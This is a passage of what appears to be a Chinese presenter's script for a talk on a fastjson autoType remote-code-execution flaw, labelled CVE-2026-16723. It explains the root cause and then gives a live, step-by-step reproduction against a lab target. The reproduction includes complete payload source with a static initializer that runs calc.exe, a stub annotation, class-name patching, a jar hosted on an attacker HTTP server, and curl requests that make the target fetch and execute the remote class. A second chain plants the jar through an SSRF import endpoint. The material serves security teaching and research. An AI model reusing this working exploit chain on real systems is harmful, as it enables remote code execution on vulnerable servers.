+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; ...) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);   <span class="comment">// 1765 原样取出</span></span><br><span class="line">    <span class="type">Class</span>&lt;?&gt; <span class="variable">clazz</span> <span class="operator">=</span> config.checkAutoType(typeName, ...);   <span class="comment">// 1767</span></span><br></pre></td></tr></table></figure>
+
+<p><code>@type</code> 的值取出来之后，<strong>不校验、不转义、不禁字符</strong>。后面所有问题，都建立在这个前提上——它从来没被当成不可信输入。</p>
+<h3 id="2-四道闸，一道都没拦住（4-00）"><a href="#2-四道闸，一道都没拦住（4-00）" class="headerlink" title="2. 四道闸，一道都没拦住（4:00）"></a>2. 四道闸，一道都没拦住（4:00）</h3><p>【动作】切到报告 2.2 的表格。</p>
+<p><code>checkAutoType</code> 进去之前有四道检查，看起来很严密：</p>
+<p>SafeMode 开关、长度 <code>3 ≤ len &lt; 192</code>、首末字符哈希、黑名单哈希。</p>
+<p>我们的类名长度合规，首字符是 <code>j</code>，也不在任何黑名单里。</p>
+<p>第四道最值得说：**黑名单枚举的是”类的集合”，我给的是一段”路径字符串”**。两者不在同一个维度上。这也解释了为什么这个漏洞不能靠”再加几个类名”修掉。</p>
+<h3 id="3-核心缺陷（5-00）★-全场最重要的一段"><a href="#3-核心缺陷（5-00）★-全场最重要的一段" class="headerlink" title="3. 核心缺陷（5:00）★ 全场最重要的一段"></a>3. 核心缺陷（5:00）★ 全场最重要的一段</h3><p>【动作】切到报告 2.3，指那 20 行。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + <span class="string">&quot;.class&quot;</span>;        <span class="comment">// 1482</span></span><br><span class="line">is = defaultClassLoader.getResourceAsStream(resource);          <span class="comment">// 1484</span></span><br><span class="line"><span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(is, <span class="literal">true</span>);            <span class="comment">// 1489</span></span><br><span class="line">classReader.accept(visitor);                                    <span class="comment">// 1492</span></span><br><span class="line">jsonType = visitor.hasJsonType();                               <span class="comment">// 1493</span></span><br></pre></td></tr></table></figure>
+
+<p>这四行在做一件事：<strong>判断这个类型可不可信</strong>。</p>
+<p>它是怎么判断的？把这个名字当成资源路径，去读它的字节，看看字节里有没有一个注解。</p>
+<p>换句话说——<strong>判断”是否可信”的动作，本身执行了一次加载。</strong></p>
+<p>这就是整个漏洞的核心。不是某一行写错了，而是这个设计从根上就有问题。</p>
+<p>再看 1482 行那个 <code>replace(&#39;.&#39;, &#39;/&#39;)</code>。它把点号还原成斜杠，于是 <code>jar:file:.C:.fj...</code> 变成 <code>jar:file:/C:/fj/...</code>。协议头那个冒号一直保留着，而 <code>getResourceAsStream</code> 遇到长得像 URL 的名字，会走 URL 处理。</p>
+<p><strong>这一步就是 SSRF 的来源，也是后面 <code>defineClass</code> 的字节来源。</strong></p>
+<p>顺便说一句：1494 行 catch 之后什么都不打。所以探测阶段<strong>零日志</strong>。目标已经替你把任意地址打开了，日志里干干净净。</p>
+<h3 id="4-自签的通行证（6-30）"><a href="#4-自签的通行证（6-30）" class="headerlink" title="4. 自签的通行证（6:30）"></a>4. 自签的通行证（6:30）</h3><p>【动作】切到报告 2.4。</p>
+<p>判定逻辑在 <code>TypeCollector</code>，展开之后只有一行有效代码：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">&quot;Lcom/alibaba/fastjson/annotation/JSONType;&quot;</span>.equals(desc)) &#123;</span><br><span class="line">    jsonType = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>注解表里出现那 42 个字符，就算可信。</strong></p>
+<p>不看来历、不看加载器、不看这个类是谁写的、也不看注解的实现是什么。</p>
+<p>这就是我为什么在载荷里放了一个 <code>@JSONType</code>，以及为什么本地还要写一份”假的”注解——一会儿现场会看到。</p>
+<p>一个自签的通行证，抵掉了三道针对危险类的检查。</p>
+<p>【动作】切到报告 2.5。</p>
+<p><code>ParserConfig</code> 1510 行，<code>jsonType</code> 为真时<strong>直接 return</strong>。下面 1513 行那段”ClassLoader &#x2F; DataSource 不许加载”的加固，永远执行不到。</p>
+<p>这不是绕过，是走了另一条分支——代码认为”带 <code>@JSONType</code> 的类是作者自己标的，不用再查”。</p>
+<h3 id="5-最后两道门（7-30）"><a href="#5-最后两道门（7-30）" class="headerlink" title="5. 最后两道门（7:30）"></a>5. 最后两道门（7:30）</h3><p>【动作】切到报告 2.6。</p>
+<p><code>TypeUtils.loadClass</code> 把类名原样交给加载器，最后到 JVM：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">defineClass(<span class="string">&quot;jar:file:/C:/fj/uploads/imp!/Evil&quot;</span>, bytes, <span class="number">0</span>, bytes.length);</span><br></pre></td></tr></table></figure>
+
+<p>JVM 有一条强制校验：<strong>你请求的名字，必须和 class 文件里 <code>this_class</code> 自称的名字逐字相同。</strong></p>
+<p>不一样就报 <code>wrong name</code>。</p>
+<p>所以载荷必须改字节里的 <code>this_class</code>——让这个类<strong>自称</strong>叫那串路径。它从此只有一个合法身份：目标磁盘上那个 jar 的地址。</p>
+<p>【动作】切到 2.7。</p>
+<p><code>loadClass</code> 成功只是拿到 <code>Class</code> 对象，<code>static</code> 块还没跑。真正的执行发生在后面实例化的那一刻——类的首次主动使用触发初始化，<code>&lt;clinit&gt;</code> 执行。</p>
+<p><strong>这一步是 JVM 的正常行为，不是缺陷。</strong> 问题在于：谁有资格让这段字节，变成目标进程里的一个类。</p>
+<h3 id="小结（8-30）"><a href="#小结（8-30）" class="headerlink" title="小结（8:30）"></a>小结（8:30）</h3><p>整条链走一遍：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">@type 字符串            ← 我控制</span><br><span class="line">  → 点转斜杠 + .class    变成一次合法 URL</span><br><span class="line">  → getResourceAsStream  目标替我打开</span><br><span class="line">  → ASM 扫注解           看到我自己签的 @JSONType</span><br><span class="line">  → 判定&quot;可信&quot;</span><br><span class="line">  → loadClass</span><br><span class="line">  → defineClass          JVM 按 this_class 校验</span><br><span class="line">  → &lt;clinit&gt;             代码执行</span><br></pre></td></tr></table></figure>
+
+<p>这条链上<strong>没有一处”绕过”，也没有一处逻辑错误</strong>。</p>
+<p>是检查本身就在做加载，而”可信”的凭证，由被检查的对象自己签发。</p>
+<p>记住这两句，后面被问到”为什么打了这么多年还在打”，就是这个原因。</p>
+<hr>
+<h2 id="三、复现：链一（9-00-–-15-30）"><a href="#三、复现：链一（9-00-–-15-30）" class="headerlink" title="三、复现：链一（9:00 – 15:30）"></a>三、复现：链一（9:00 – 15:30）</h2><p>【动作】切到手册第 3 节，同时把虚机终端放大。</p>
+<h3 id="1-先讲清楚这个恶意文件是什么（9-00）"><a href="#1-先讲清楚这个恶意文件是什么（9-00）" class="headerlink" title="1. 先讲清楚这个恶意文件是什么（9:00）"></a>1. 先讲清楚这个恶意文件是什么（9:00）</h3><p>【动作】切到手册第 3 节的代码块（投屏给大家看，虚机上还没写）。</p>
+<p>这就是我一会儿要在虚机上写的文件。三十行，只有三个东西值得看。</p>
+<p><strong>第一个，<code>static {}</code> 块。</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;calc.exe&quot;</span>).start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里没有 main，也不需要谁来 new 它。<strong>类被加载的那一刻，它自己就跑。</strong></p>
+<p>这是整件事最关键的一句：<strong>被加载，就是被执行。</strong> 所以”投递载荷”这四个字，等于”把这段字节送到目标 JVM 能加载到的地方”。</p>
+<p>顺便说个坑：这个块里读类加载器，我写的是 <code>Thread.currentThread().getContextClassLoader()</code>，不能写 <code>EvilEx.class.getClassLoader()</code>。远程加载时，<code>ldc</code> 解析自己的类名会失败，<code>static</code> 跑到一半抛异常，看起来就像”没执行”。</p>
+<p><strong>第二个，<code>@JSONType</code>。</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@JSONType</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilEx</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123;</span><br></pre></td></tr></table></figure>
+
+<p>就是刚才那 42 个字符的通行证。没有它，请求停在 <code>autoType is not support.</code>。</p>
+<p><strong>第三个，<code>extends Exception</code>。</strong></p>
+<p>这不是随手写的。它决定了 fastjson 用哪个反序列化器：普通类走 ASM 生成的反序列化器，实例化时会拿斜杠形式的内部名再解析一次类；继承 <code>Throwable</code> 走反射，手里已经有 <code>Class</code> 对象，不再按名找第二次。</p>
+<p>后面链二会讲这个差别为什么致命。</p>
+<p>还有两个配角：</p>
+<p><strong>桩注解</strong> <code>com/alibaba/fastjson/annotation/JSONType.java</code>。虚机上没有 fastjson，编译不过，所以放一份”假”的让 javac 通过。它必须写 <code>@Retention(RUNTIME)</code>——默认是 CLASS，不写进 class 文件，运行时通行证就没了。</p>
+<p><strong>改名脚本</strong> <code>patch_name.py</code>。把 class 常量池里 <code>this_class</code> 那条字符串换掉。改完这个类就”自称”叫那串路径了。</p>
+<h3 id="2-现场写（10-30）"><a href="#2-现场写（10-30）" class="headerlink" title="2. 现场写（10:30）"></a>2. 现场写（10:30）</h3><p>【动作】开始敲，一条一条来，别粘一大段。每条敲完念一句在干什么。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/ssrf</span><br><span class="line"><span class="built_in">mkdir</span> -p com/alibaba/fastjson/annotation</span><br></pre></td></tr></table></figure>
+
+<p>先写载荷：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt; EvilEx.java &lt;&lt;<span class="string">&#x27;JAVA&#x27;</span></span><br><span class="line">import com.alibaba.fastjson.annotation.JSONType;</span><br><span class="line"></span><br><span class="line">@JSONType</span><br><span class="line">public class EvilEx extends Exception &#123;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="title">EvilEx</span></span>() &#123; super(<span class="string">&quot;poc&quot;</span>); &#125;</span><br><span class="line">    public EvilEx(String m) &#123; super(m); &#125;</span><br><span class="line"></span><br><span class="line">    static &#123;</span><br><span class="line">        StringBuilder sb = new StringBuilder();</span><br><span class="line">        sb.append(<span class="string">&quot;CVE-2026-16723 single-stage (jar:http dot-form)\n&quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;user   : &quot;</span>).append(System.getProperty(<span class="string">&quot;user.name&quot;</span>)).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;java   : &quot;</span>).append(System.getProperty(<span class="string">&quot;java.version&quot;</span>)).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;loader : &quot;</span>).append(Thread.currentThread().getContextClassLoader()).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        try &#123;</span><br><span class="line">            java.nio.file.Files.write(</span><br><span class="line">                java.nio.file.Paths.get(<span class="string">&quot;C:/fj/rce-proof-http.txt&quot;</span>),</span><br><span class="line">                sb.toString().getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        &#125; catch (Throwable ignored) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        try &#123;</span><br><span class="line">            new ProcessBuilder(<span class="string">&quot;calc.exe&quot;</span>).start();</span><br><span class="line">        &#125; catch (Throwable ignored) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">JAVA</span><br></pre></td></tr></table></figure>
+
+<p>“这段 <code>static</code> 只做两件事：写一个证明文件、弹一次计算器。不反弹 shell、不持久化。”</p>
+<p>再写桩注解：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt; com/alibaba/fastjson/annotation/JSONType.java &lt;&lt;<span class="string">&#x27;JAVA&#x27;</span></span><br><span class="line">package com.alibaba.fastjson.annotation;</span><br><span class="line"></span><br><span class="line">import java.lang.annotation.ElementType;</span><br><span class="line">import java.lang.annotation.Retention;</span><br><span class="line">import java.lang.annotation.RetentionPolicy;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line"></span><br><span class="line">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="line">@Target(ElementType.TYPE)</span><br><span class="line">public @interface JSONType &#123;</span><br><span class="line">&#125;</span><br><span class="line">JAVA</span><br></pre></td></tr></table></figure>
+
+<p>编译：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p classes</span><br><span class="line">javac --release 8 -nowarn -d classes EvilEx.java com/alibaba/fastjson/annotation/JSONType.java</span><br><span class="line"><span class="built_in">cp</span> classes/EvilEx.class clean2.class</span><br></pre></td></tr></table></figure>
+
+<p>“<code>--release 8</code> 不能省。靶机是 JDK 8，class 版本必须是 52，我本机的 javac 是 21，漏了这个参数就是 65，打过去直接 <code>UnsupportedClassVersionError</code>。”</p>
+<h3 id="3-改名（11-30）"><a href="#3-改名（11-30）" class="headerlink" title="3. 改名（11:30）"></a>3. 改名（11:30）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">IP=$(hostname -I | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">IFS=. <span class="built_in">read</span> a b c d &lt;&lt;&lt; <span class="string">&quot;<span class="variable">$IP</span>&quot;</span></span><br><span class="line">DEC=$((a*<span class="number">16777216</span> + b*<span class="number">65536</span> + c*<span class="number">256</span> + d))</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;IP=<span class="variable">$IP</span>  DEC=<span class="variable">$DEC</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>“这里必须两个数都有：点分地址给 curl 用，十进制给类名用。”</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">NAME=<span class="string">&#x27;jar:http://&#x27;</span><span class="string">&quot;<span class="variable">$DEC</span>&quot;</span><span class="string">&#x27;:19090/impe!/EvilEx&#x27;</span></span><br><span class="line">python3 patch_name.py clean2.class <span class="string">&quot;<span class="variable">$NAME</span>&quot;</span> classes/EvilEx.class</span><br><span class="line">javap -v -p classes/EvilEx.class | grep this_class</span><br></pre></td></tr></table></figure>
+
+<p>【动作】把输出指给大家看。</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">类名: EvilEx -&gt; jar:http://3232298115:19090/impe!/EvilEx</span><br><span class="line">  this_class: #92  // &quot;jar:http://3232298115:19090/impe!/EvilEx&quot;</span><br></pre></td></tr></table></figure>
+
+<p>“这一步为什么必须做？因为 JVM 要校验名字。类文件里得写着它自己叫这个 URL，否则报 <code>wrong name</code>。”</p>
+<p>三条规则，一次说清：</p>
+<table>
+<thead>
+<tr>
+<th>位置</th>
+<th>写什么</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>jar 里的条目名</td>
+<td><code>EvilEx.class</code></td>
+</tr>
+<tr>
+<td>字节里的 <code>this_class</code></td>
+<td><code>jar:http://&lt;DEC&gt;:19090/impe!/EvilEx</code></td>
+</tr>
+<tr>
+<td>我发的 <code>@type</code></td>
+<td><code>jar:http:..&lt;DEC&gt;:19090.impe!.EvilEx</code></td>
+</tr>
+</tbody></table>
+<p>“<code>@type</code> 三个点号，<code>this_class</code> 三个斜杠，是同一样东西。IP 必须十进制——因为 fastjson 会把 <code>@type</code> 里所有点都换成斜杠，写 <code>192.168.244.131</code> 会被拆成 <code>192/168/244/131</code>，地址直接废掉，报错还只显示 <code>autoType is not support</code>，看不出是地址坏了。”</p>
+<h3 id="4-打包（12-20）"><a href="#4-打包（12-20）" class="headerlink" title="4. 打包（12:20）"></a>4. 打包（12:20）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;</span></span><br><span class="line"><span class="string">import zipfile, os</span></span><br><span class="line"><span class="string">z = zipfile.ZipFile(&#x27;impe&#x27;, &#x27;w&#x27;, zipfile.ZIP_DEFLATED)</span></span><br><span class="line"><span class="string">z.write(&#x27;classes/EvilEx.class&#x27;, &#x27;EvilEx.class&#x27;)</span></span><br><span class="line"><span class="string">z.close()</span></span><br><span class="line"><span class="string">print(os.path.getsize(&#x27;impe&#x27;), zipfile.ZipFile(&#x27;impe&#x27;).namelist())&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1105 [&#x27;EvilEx.class&#x27;]</span><br></pre></td></tr></table></figure>
+
+<p>“为什么非要打包？因为 <code>jar:</code> 这个协议不认 class，只认 zip。它要去中央目录里找条目，裸 class 文件连解析都过不去——我实测过，同一个名字、同样的路径，裸文件取字节直接是空，打成 zip 之后才读得到。”</p>
+<p>“而且 zip 给了两层名字：条目名是 <code>EvilEx.class</code>，类名可以是那串 URL。这就是为什么文件名不用改，改的只是它自称的名字。”</p>
+<h3 id="5-起服务（12-50）"><a href="#5-起服务（12-50）" class="headerlink" title="5. 起服务（12:50）"></a>5. 起服务（12:50）</h3><p>【动作】新开一个终端，或者用 <code>&amp;</code>（如果习惯）。建议单独窗口，因为一会儿要看日志。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/ssrf</span><br><span class="line">python3 -m http.server 19090 --<span class="built_in">bind</span> 0.0.0.0</span><br></pre></td></tr></table></figure>
+
+<p>“必须在这个目录起，否则 <code>/impe</code> 是 404。”</p>
+<h3 id="6-打（13-10）"><a href="#6-打（13-10）" class="headerlink" title="6. 打（13:10）"></a>6. 打（13:10）</h3><p>【动作】回到第一个终端。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -s <span class="string">&#x27;http://192.168.244.1:18086/trace?type=jar:http:..3232298115:19090.impe!.EvilEx&amp;step=parse&#x27;</span>; <span class="built_in">echo</span></span><br></pre></td></tr></table></figure>
+
+<p>【动作】说完这句再回车，留 1 秒给大家看结果。</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;jar:http:..3232298115:19090.impe!.EvilEx&quot;</span><span class="punctuation">,</span><span class="attr">&quot;jsonParse&quot;</span><span class="punctuation">:</span><span class="string">&quot;...&quot;</span><span class="punctuation">,</span><span class="attr">&quot;instance&quot;</span><span class="punctuation">:</span><span class="string">&quot;...&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>“同时看三个地方。”</p>
+<p>【动作】依次指出，中间停两秒。</p>
+<p><strong>第一，<code>http.server</code> 那个窗口。</strong> 多了一条：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">192.168.244.1 - - &quot;GET /impe HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></figure>
+
+<p><code>192.168.244.1</code> 是靶机。<strong>它主动到我这儿来取文件的。</strong> 这就是 SSRF 在链一里的位置——不是我推给它，是它自己拉。</p>
+<p><strong>第二，靶机桌面。</strong> 计算器弹出来了。这个计算器是靶机的，不是虚机的，<code>calc.exe</code> 是 Windows 的进程。</p>
+<p><strong>第三，proof 文件。</strong></p>
+<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\fj\rce-proof-http.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">CVE-2026-16723 single-stage (jar:http dot-form)</span><br><span class="line">user   : MECHREVO</span><br><span class="line">java   : 1.8.0_66</span><br><span class="line">loader : org.springframework.boot.loader.LaunchedURLClassLoader@21b8d17c</span><br></pre></td></tr></table></figure>
+
+<p>“<code>loader</code> 这行是最硬的证据。<code>LaunchedURLClassLoader</code> 是 Spring Boot 启动器里的类加载器，只存在于靶机那个 JVM 里，我这台虚机给不出来。”</p>
+<h3 id="7-复盘这条链（14-40）"><a href="#7-复盘这条链（14-40）" class="headerlink" title="7. 复盘这条链（14:40）"></a>7. 复盘这条链（14:40）</h3><p>【动作】切回报告第 4 节。</p>
+<p>“整条链，一个请求，我发了什么？”</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;jar:http:..3232298115:19090.impe!.EvilEx&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>“就这一行。靶机拿到之后：</p>
+<ol>
+<li>把点还原成斜杠，拼出 <code>jar:http://3232298115:19090/impe!/EvilEx.class</code>；</li>
+<li>自己发一个 GET 去取——<strong>这一步就是 SSRF</strong>；</li>
+<li>字节拿回来，ASM 看到我自己签的 <code>@JSONType</code>，判定可信；</li>
+<li><code>defineClass</code>，类名对得上；</li>
+<li>实例化，<code>&lt;clinit&gt;</code> 执行，计算器。</li>
+</ol>
+<p>靶机磁盘上<strong>没有多出任何 jar</strong>。它只是在自己的临时目录里缓存了一份，用完就扔。”</p>
+<p>“这条链漂亮在省事，但它有一个前提——载荷必须继承 <code>Throwable</code>。为什么？下面这条链就是为了解决这个前提。”</p>
+<hr>
+<h2 id="四、链二：为什么最后只能-jar-file（15-30-–-18-00）"><a href="#四、链二：为什么最后只能-jar-file（15-30-–-18-00）" class="headerlink" title="四、链二：为什么最后只能 jar:file（15:30 – 18:00）"></a>四、链二：为什么最后只能 <code>jar:file</code>（15:30 – 18:00）</h2><p>【动作】切到报告 4.1、4.2。</p>
+<h3 id="1-换个载荷会怎样（15-30）"><a href="#1-换个载荷会怎样（15-30）" class="headerlink" title="1. 换个载荷会怎样（15:30）"></a>1. 换个载荷会怎样（15:30）</h3><p>刚才那个类，我写的是 <code>extends Exception</code>。如果我老老实实写一个普通类——<code>public class Evil { }</code>，没有父类——同样的名字、同样的请求，结果是这样：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">NoClassDefFoundError: jar:http://.../imp4!/Evil</span><br><span class="line">    at FastjsonASMDeserializer_1_Evil.createInstance</span><br></pre></td></tr></table></figure>
+
+<p>注意它失败的位置：不是加载失败，是<strong>实例化</strong>失败。</p>
+<p>原因在这一行：fastjson 给普通类生成了一个 ASM 反序列化器，里面的 <code>new</code> 指令写的是<strong>斜杠形式的内部名</strong>——<code>jar:http://...</code>。JVM 拿这个名字再解析一次，可这时候网络流已经关了，取不到字节。</p>
+<p>而 <code>Throwable</code> 子类走反射，<code>clazz.newInstance()</code>，手里已经有 <code>Class</code> 对象，不需要第二次按名解析。</p>
+<p>所以准确的说法是：<strong>能定义，但走不完。</strong> 卡在”再读一次”。</p>
+<h3 id="2-那第二次读，从哪来（16-20）"><a href="#2-那第二次读，从哪来（16-20）" class="headerlink" title="2. 那第二次读，从哪来（16:20）"></a>2. 那第二次读，从哪来（16:20）</h3><p>只要字节能被读第二次，这条路就通了。</p>
+<p>Linux 上有个现成的：JVM 用 <code>jar:http://</code> 拉远程 jar 时，会缓存成 <code>/tmp/jar_cache*.tmp</code>，<strong>文件句柄一直开着</strong>。fd 指向的是文件，不是一次性网络流。</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">@type = jar:http:..attack.er.19090.p!.Exception    → JVM 自己下载、自己缓存</span><br><span class="line">@type = jar:file:.proc.self.fd.N!.Exception        → 指着那个 fd，第二次读也命中</span><br></pre></td></tr></table></figure>
+
+<p>这就是官方公告敢说”唯一前置条件是 fat-jar”的底气——投递由 JVM 自己完成，目标连上传功能都不需要。</p>
+<p>但 Windows 没有 <code>/proc/self/fd</code>，<code>jar_cache</code> 文件名又是随机的，指不过去。</p>
+<p>所以在 Windows 上，想让字节可重读，只剩一个办法：<strong>真的写一份到磁盘上。</strong></p>
+<p>这就是链二。<code>/import</code> 这个端点做的事很朴素——给它一个 URL，它去取，然后存到 <code>C:\fj\uploads\</code>。</p>
+<h3 id="3-现场打（17-00，时间紧可只讲不跑）"><a href="#3-现场打（17-00，时间紧可只讲不跑）" class="headerlink" title="3. 现场打（17:00，时间紧可只讲不跑）"></a>3. 现场打（17:00，时间紧可只讲不跑）</h3><p>【准备】<code>payloadf</code> 必须提前按手册第 10～13 步做好（<code>Evil.java</code> 编译 → 改名成 <code>jar:file:/C:/fj/uploads/imp!/Evil</code> → 打包）。没做的话这一段只能讲，不能跑。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">IP=$(hostname -I | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">curl -s <span class="string">&quot;http://192.168.244.1:18086/import?url=http://<span class="variable">$IP</span>:19090/payloadf&amp;name=imp&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;fetched&quot;</span><span class="punctuation">:</span><span class="string">&quot;http://192.168.244.131:19090/payloadf&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;saved&quot;</span><span class="punctuation">:</span><span class="string">&quot;C:\\fj\\uploads\\imp&quot;</span><span class="punctuation">,</span><span class="attr">&quot;bytes&quot;</span><span class="punctuation">:</span><span class="number">1060</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;typeName&quot;</span><span class="punctuation">:</span><span class="string">&quot;jar:file:.C:.fj.uploads.imp!.Evil&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>“看 <code>http.server</code> 的日志，又是一条来自 <code>192.168.244.1</code> 的 GET。<strong>真正意义上的 SSRF 在这里</strong>——目标收到一个 URL，自己去访问，把结果写到自己磁盘上。”</p>
+<p>“然后触发，就一步：”</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -s <span class="string">&#x27;http://192.168.244.1:18086/trace?type=jar:file:.C:.fj.uploads.imp!.Evil&amp;step=parse&#x27;</span>; <span class="built_in">echo</span></span><br></pre></td></tr></table></figure>
+
+<p>“计算器再弹一次。这条链里执行那一段和刚才<strong>一模一样</strong>，唯一的区别是字节从哪来。”</p>
+<h3 id="4-为什么最后只能-jar-file（17-40）★"><a href="#4-为什么最后只能-jar-file（17-40）★" class="headerlink" title="4. 为什么最后只能 jar:file（17:40）★"></a>4. 为什么最后只能 <code>jar:file</code>（17:40）★</h3><p>这是今天最后一个技术点，三条约束叠起来，最后只剩一个答案。</p>
+<p><strong>第一条，类名不能含斜杠。</strong></p>
+<p>JVM 的 <code>checkName</code> 就一句话：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (name.indexOf(<span class="string">&#x27;/&#x27;</span>) != -<span class="number">1</span> || name.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>
+
+<p>纯字符串判断。所以 <code>@type</code> 必须全点号写，斜杠写法在任何 JDK 上都是 <code>IllegalName</code>。</p>
+<p><strong>第二条，点号化会毁掉 URL 里的地址。</strong></p>
+<p><code>@type</code> 里所有点都会被换成斜杠，所以点分 IP 写不出来——只能写十进制，或者 <code>localhost</code>。这一步是能做，但它意味着远程路径的构造非常脆弱：IP 一变，载荷就得重新打包。</p>
+<p><strong>第三条，字节要能被读第二次。</strong></p>
+<p>远程那个流是一次性的，实例化的时候已经关了。要么有文件、要么有 fd。</p>
+<p>三条合起来：</p>
+<table>
+<thead>
+<tr>
+<th>约束</th>
+<th><code>jar:http:..</code></th>
+<th><code>jar:file:</code></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>类名不能含 <code>/</code></td>
+<td>可以（写十进制 IP）</td>
+<td>可以（路径本来就点号化）</td>
+</tr>
+<tr>
+<td>地址稳定</td>
+<td>❌ IP 一变就得重打包</td>
+<td>✅ 类名里没有 IP</td>
+</tr>
+<tr>
+<td>字节可重读</td>
+<td>❌ 网络流一次性</td>
+<td>✅ 文件可以反复打开</td>
+</tr>
+</tbody></table>
+<p><strong>所以 <code>jar:file</code> 是唯一同时满足这三条的形态。</strong> 它不挑 JDK 版本、不挑载荷形态、不依赖 IP。</p>
+<p>再补一句关于 JDK 版本的：这事跟版本不是完全无关。JDK 9 以上对类名的处理更严——我拿 21 测过，斜杠形式直接 <code>ClassFormatError</code>。点号形式我只在 8u66 上完整验证过，没有在 21 上跑到最后。</p>
+<p>所以稳妥的讲法是：**新版本上不要赌点号形式能不能过，直接走 <code>jar:file</code>**——这也是很多分析文章把两阶段说成”高版本方案”的原因。</p>
+<p>一句话收束这一节：</p>
+<blockquote>
+<p><strong><code>jar:http</code> 是省事的版本，<code>jar:file</code> 是通用的版本。省事的那条靠”载荷继承 Throwable”撑着，通用的那条不挑。</strong></p>
+</blockquote>
+<hr>
+<h2 id="五、收尾（18-00-–-18-40）"><a href="#五、收尾（18-00-–-18-40）" class="headerlink" title="五、收尾（18:00 – 18:40）"></a>五、收尾（18:00 – 18:40）</h2><p>【动作】切到报告第 8 节。</p>
+<p>三句话，结束今天的内容。</p>
